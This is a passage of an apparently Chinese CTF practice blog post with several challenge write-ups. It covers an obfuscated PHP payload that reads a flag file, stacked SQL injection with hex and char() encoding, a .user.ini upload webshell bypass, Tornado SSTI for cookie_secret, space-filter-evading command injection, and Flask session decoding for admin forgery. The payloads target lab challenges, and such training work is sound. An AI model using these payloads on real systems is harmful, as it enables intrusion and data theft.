class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))((((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))))</span><br></pre></td></tr></table></figure><p>在根目录发现 flag 文件<code>f1agg</code>。<br> 最终 payload 构造：<code>(serIALIze)(FILe(/f1agg))</code>读取文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))))</span><br></pre></td></tr></table></figure><p>注意最后发送的时候需要再 URLencode 一下。</p><h3 id="3-强网杯-2019-随便注"><a href="#3-强网杯-2019-随便注" class="headerlink" title="3.[强网杯 2019]随便注"></a>3.[强网杯 2019]随便注</h3><p>推一波MrYunen师傅的<a href="https://xz.aliyun.com/t/7169#toc-47" target="_blank" rel="noopener">注入圣经</a></p><p>尝试语句<code>1&#39; or 1=1 #</code>发现返回多个结果，说明存在注入</p><p>接着 order by爆字段 发现就两个字段</p><p>然后查询数据，有过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure><p>这里可以利用堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1'; <span class="keyword">show</span> <span class="keyword">databases</span>; <span class="comment">#</span></span><br><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>; <span class="comment">#  //表名是数字用反引号</span></span><br></pre></td></tr></table></figure><p>flag就在这串数字表中</p><ol><li><p>通过编码绕过</p><p> 因为select被过滤了，所以先将 select * from  `1919810931114514` 进行16进制编码再通过构造payload得</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0';<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;<span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p> 当然也可以通过 <code>char()</code></p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0';<span class="keyword">set</span> @s=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">103</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">96</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">56</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">48</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">51</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">53</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">96</span>));<span class="keyword">PREPARE</span> a <span class="keyword">FROM</span> @s;<span class="keyword">EXECUTE</span> a;</span><br></pre></td></tr></table></figure><ul><li>prepare…from…是预处理语句，会进行编码转换。</li><li>execute用来执行由SQLPrepare创建的SQL语句。</li><li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</li></ul></li><li><p>handler</p><p> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="4-SUCTF-2019-CheckIn"><a href="#4-SUCTF-2019-CheckIn" class="headerlink" title="4.[SUCTF 2019]CheckIn"></a>4.[SUCTF 2019]CheckIn</h3><p>文件的内容不能包含<code>&lt;?</code>，但可以上传<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马来绕过</p><p>利用 <code>.user.ini</code>绕过,解析php</p><p>利用前提</p><ol><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol><p><img src="/2020/06/6月刷题记录/image-20200608004804065.png" alt="image-20200608004804065"></p><p>关键在这两个关键字</p><p><img src="/2020/06/6月刷题记录/image-20200608004839982.png" alt="image-20200608004839982"></p><p><strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p><p>先上传 <code>.user.ini</code></p><p><img src="/2020/06/6月刷题记录/image-20200608005009468.png" alt="image-20200608005009468"></p><p>接着传马</p><p><img src="/2020/06/6月刷题记录/image-20200608005047907.png" alt="image-20200608005047907"></p><p>再去访问上传目录即可获得flag</p><h3 id="5-护网杯-2018-easy-tornado"><a href="#5-护网杯-2018-easy-tornado" class="headerlink" title="5.[护网杯 2018]easy_tornado"></a>5.[护网杯 2018]easy_tornado</h3><p>flag.txt 提示flag在 <code>/fllllllllllllag</code> </p><p>welcome.txt 的render 可能存在SSTI注入</p><p>hints.txt 提示我们 filehash的加密格式 md5(cookie_secret+md5(filename))</p><p>先直接访问 <code>/fllllllllllllag</code>  直接报错，看URL应该是SSTI注入</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;<span class="number">2</span>^<span class="number">1</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>直接回显 <code>3</code> ，过滤了很多符号，命令执行就别想了</p><p>说明确实存在注入。后面如何通过注入得到 cookie_secret实在是不知道</p><p>大佬一句 阅读tornado源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/tornadoweb/</span>tornado<span class="regexp">/blob/m</span>aster<span class="regexp">/tornado/</span>auth.py</span><br></pre></td></tr></table></figure><p>发现<code>handler.settings</code>存放了cookie_secret （ORZ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">cookie_secret = <span class="string">'8bf1192d-691c-4345-8667-78a8a7899ff0'</span></span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">hash = hashlib.md5((cookie_secret + hashlib.md5(filename.encode()).hexdigest()).encode())</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure><p>构造下URL即可拿到flag</p><h3 id="6-GXYCTF2019-Ping-Ping-Ping"><a href="#6-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="6.[GXYCTF2019]Ping Ping Ping"></a>6.[GXYCTF2019]Ping Ping Ping</h3><p>简单的命令注入</p><p>直接用 <code>;</code>分割命令成功，直接执行 <code>ls</code>回显 <code>flag.php</code>和<code>index.php</code>接着读<code>index.php</code>发现过滤了空格用 <code>$IFS$9</code>绕过</p><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我用的是base64绕过</p><p>payload </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;`<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$9Y2F0IGZsYWcucGhwCg</span>==|base64<span class="variable">$IFS</span><span class="variable">$9</span>-d`</span><br></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1</span>`<span class="keyword">ls</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="comment">//    die("fxck your flag!");</span></span><br><span class="line"><span class="comment">//匹配一个字符串中，是否按顺序出现过flag四个字母</span></span><br><span class="line">;a=<span class="keyword">g</span>;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure><h3 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h3><p>在登录页面的注释中有一句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure><p>随便注册个账号进去，在改变密码的页面注释泄露github地址<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p><p>在index.html中</p><p><img src="/2020/06/6月刷题记录/image-20200622145001059.png" alt="image-20200622145001059"></p><p>admin登录后得到flag</p><p>这道题有两种解法</p><ul><li><p>session伪造</p><p>  根据P师傅的<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">文章</a>，flask的session都是在本地的，通过一个SECRET_KEY进行签名,可以直接使用<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">脚本</a>进行加解密</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager<span class="number">3</span>.py decode -<span class="keyword">c</span> .eJxFUE<span class="number">2</span>LwjAU_CvLO<span class="number">3</span>uIFi-CB<span class="number">6E2</span>VHgvWFLDy<span class="number">0</span>VcrW<span class="number">3</span>axoW<span class="number">2</span>Ylvxv<span class="number">2</span>_Xhd<span class="number">3</span>DnGaYryccr<span class="number">03</span>WFrDqmns<span class="number">2</span>g<span class="number">6</span>O<span class="number">7</span>wOoJH<span class="number">5</span>-wAlzgkj<span class="number">0</span>LNFQrmRQqjAXrxOF<span class="number">4</span>FlZHzpZFhWFRsIk<span class="number">8</span>euvYpAPrNKCSfrRLJdOedT<span class="number">5</span>ajz<span class="number">3</span>Jg<span class="number">1</span>fhXqCO<span class="number">59</span>bwYP<span class="number">2</span>hVLoKUMYPkuR<span class="number">5</span>rAb<span class="number">2</span>SUmG<span class="number">52</span>xQqHDnUEbeSlzwuFnimAdWpsOE<span class="number">0</span>YYHN-XXrLlHiQMZXMNrBue<span class="number">2</span>uR<span class="number">67</span>ryq<span class="number">7</span>_U<span class="number">2</span>wfttbY<span class="number">2</span>vUG<span class="number">0</span>EyqaZaAZdFjT<span class="number">6</span>pyewXpPePqcZAeleRjAMVbgVt<span class="number">1</span>m<span class="number">8750959</span>n<span class="number">9</span>GZAXlv<span class="number">8</span>zt<span class="number">5</span>CcCuqztYAb<span class="number">3</span>Nmvet<span class="number">8</span>FcwOsb<span class="number">4</span>eJsVg.XvhXYA.DtOXFn-B-CxhrW<span class="number">07</span>nqEb<span class="number">1</span><span class="keyword">i9</span>eswM</span><br><span class="line"></span><br><span class="line">'&#123;<span class="string">"_fresh"</span>:True,<span class="string">"_id"</span>:b<span class="string">"3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c"</span>,<span class="string">"csrf_token"</span>:b<span class="string">"fa1efe1044dd827b8e2de5d654099252d4b78144"</span>,<span class="string">"image"</span>:b<span class="string">"0Vt6"</span>,<span class="string">"name"</span>:<span class="string">"admin"</span>,<span 